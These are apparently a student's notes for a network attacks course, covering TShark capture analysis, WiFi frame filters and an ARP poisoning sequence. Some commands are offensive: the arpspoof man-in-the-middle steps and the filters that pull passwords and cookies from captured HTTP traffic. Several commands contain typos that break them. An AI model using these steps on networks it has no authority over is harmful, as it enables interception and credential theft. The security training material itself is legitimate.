# **Network Based Attacks**

--------------------------------------------------------------------

## TShark: (for analysing traffic) (good for scripting)

```
$ tshark -v

$ tshark -h

$ tshark -i eth0

$ tshark -r HTTP_traffic.pcap

$ tshark -r HTTP_traffic.pcap | wc -l

$ tshark -r HTTP_traffic.pcap -z io,phs -que (statistics)
```
--------------------------------------------------------------------

## Filtering Basics

```
$ tshark -r HTTP_traffic.pcap -Y ‘http’ | more

$ tshark -r HTTP_traffic.pcap -Y ‘ip-src=192.168.252.128 && ip-dst==52.32.74.91’ 

$ tshark -r HTTP_traffic.pcap -Y ‘http.request.method==GET’  | more

$ tshark -r HTTP_traffic.pcap -Y ‘http.request.method==GET’  -Tfields -e frame.time -e ip.src -e http.request.full_uri | more

$ tshark -r HTTP_traffic.pcap -Y ‘http contains password’ | more

$ tshark -r HTTP_traffic.pcap -Y ‘http.request.method==GET && http.host==www.nytimes.com’ -Tfields -e ip.dst | more

$ tshark -r HTTP_traffic.pcap -Y ‘ip contains [amazon.in](http://amazon.in) $$ ip.src=192.168.252.128’ -Tfields -e ip.src -e hhtp.cookie | more

$ tshark -r HTTP_traffic.pcap -Y ‘ip.src==192.168.252.128 && http’ -Tfields -e http.user_agent | more
```
--------------------------------------------------------------------

## Arp Poisoning:

```
$ nmap 0.0.0.0/24

$ echo 1 > /proc/sys/net/ipv4/ip_forward

$ arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
```
--------------------------------------------------------------------

## Wifi Security:

```
Filter: (wlan.fc.type_subtype == 0x0008) && (!(wlan.wfa.ie.wpa.version == 1)) && !(wlan.tag.number == 48)

Filter: wlan contains Home_Network

Filter: wlan contains LazyArtists

Filter: (wlan.ssid contains "Amazon") && (wlan.fc.type_subtype == 0x0008)

Filter: (wlan.ta == e8:de:27:16:87:18) || (wlan.ra == e8:de:27:16:87:18)

SSID SecurityTube_Open is hsoted on BSSID e8:de:27:16:87:18. Filter: ((wlan.bssid == e8:de:27:16:87:18) ) && (wlan.fc.type_subtype == 0x0020)

Filter: (((wlan.bssid == e8:de:27:16:87:18)) && (wlan.addr==5c:51:88:31:a0:3b)) && (wlan.fc.type_subtype == 0x0001)
```
--------------------------------------------------------------------

## Filtering Wifi:

```
$ tshark -r WiFi_traffic.pcap -Y "wlan”

$ tshark -r WiFi_traffic.pcap -Y "wlan.fc.type_subtype==0x000c

$ tshark -r WiFi_traffic.pcap -Y "eapol”

$ tshark -r WiFi_traffic.pcap -Y "wlan.fc.type_subtype==8" -Tfields -e wlan.ssid -e wlan.bssid

$ tshark -r WiFi_traffic.pcap -Y "wlan.ssid==LazyArtists" -Tfields -e wlan.bssid

$ tshark -r WiFi_traffic.pcap -Y "wlan.ssid==Home_Network" -Tfields -e wlan_radio.channel

$ tshark -r WiFi_traffic.pcap -Y "wlan.fc.type_subtype==0x000c" -Tfields -e wlan.ra

$ tshark -r WiFi_traffic.pcap -Y "wlan.ta==5c:51:88:31:a0:3b && http" -Tfields -e http.user_agent
```
--------------------------------------------------------------------
